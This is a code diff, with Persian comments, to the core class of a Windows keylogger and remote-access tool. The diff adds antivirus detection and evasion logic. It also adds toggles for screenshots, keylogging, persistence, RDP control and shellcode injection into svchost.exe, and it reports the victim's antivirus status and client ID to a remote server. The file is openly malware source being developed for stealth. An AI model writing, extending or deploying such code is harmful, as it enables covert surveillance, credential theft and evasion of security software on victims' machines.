@@ -23,6 +23,8 @@ import pyautogui
 import os
 from system.vm_detector import VMDetector
 from monitoring.rdp_controller import RDPController
+from system.anti_av import AntiAV  # اضافه کردن AntiAV
+
 
 # Configure logging based on DEBUG_MODE
 if Config.DEBUG_MODE:
@@ -58,6 +60,22 @@ class KeyloggerCore:
             self.logger = ActivityLogger(Config.BUFFER_LIMIT)
             self.rdp_controller = RDPController(self.encryption)
             self.running = True
+            self.anti_av = AntiAV()  # مقداردهی AntiAV
+            self.running = True
+            self.behavior = {  # تنظیمات پیش‌فرض رفتار
+                "screenshot_enabled": True,
+                "keylogging_enabled": True,
+                "process_injection_enabled": True,
+                "rdp_enabled": True,
+                "persistence_enabled": True
+            }
+
+            # شناسایی آنتی‌ویروس و تنظیم رفتار
+            self.adjust_behavior_based_on_antivirus()
+
+            if platform.system().lower() == "windows" and not Config.DEBUG_MODE and self.behavior["process_injection_enabled"]:
+                self.attempt_process_injection()
+
 
             if platform.system().lower() == "windows" and not Config.DEBUG_MODE:
                 self.attempt_process_injection()
@@ -77,10 +95,29 @@ class KeyloggerCore:
                 logging.error(f"Initialization error: {str(e)}")
             self.emergency_stop()
 
+    def adjust_behavior_based_on_antivirus(self):
+        """
+        شناسایی آنتی‌ویروس‌ها و تنظیم رفتار ابزار
+        """
+        try:
+            antiviruses = self.anti_av.detect_antivirus()
+            for av in antiviruses:
+                behavior = self.anti_av.adjust_behavior(av)
+                self.behavior.update(behavior)
+                if Config.DEBUG_MODE:
+                    logging.info(f"Adjusted behavior for {av['name']}: {self.behavior}")
+                # ارسال گزارش آنتی‌ویروس به سرور
+                self.communicator.upload_antivirus_status({
+                    "antivirus": av,
+                    "behavior": self.behavior,
+                    "client_id": self.client_id,
+                    "timestamp": datetime.now().isoformat()
+                })
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Antivirus behavior adjustment error: {str(e)}")
+
     def attempt_process_injection(self):
-        """
-        تلاش برای تزریق کلاینت به یک فرآیند سیستمی.
-        """
         try:
             injector = ProcessInjector()
             pid = injector.find_target_process("svchost.exe")
@@ -89,7 +126,7 @@ class KeyloggerCore:
                 if shellcode and injector.inject_code(pid, shellcode):
                     if Config.DEBUG_MODE:
                         logging.info("Process injection successful. Exiting current process.")
-                    sys.exit(0)  # خروج از فرآیند فعلی
+                    sys.exit(0)
                 else:
                     if Config.DEBUG_MODE:
                         logging.warning("Process injection failed. Continuing normal execution.")
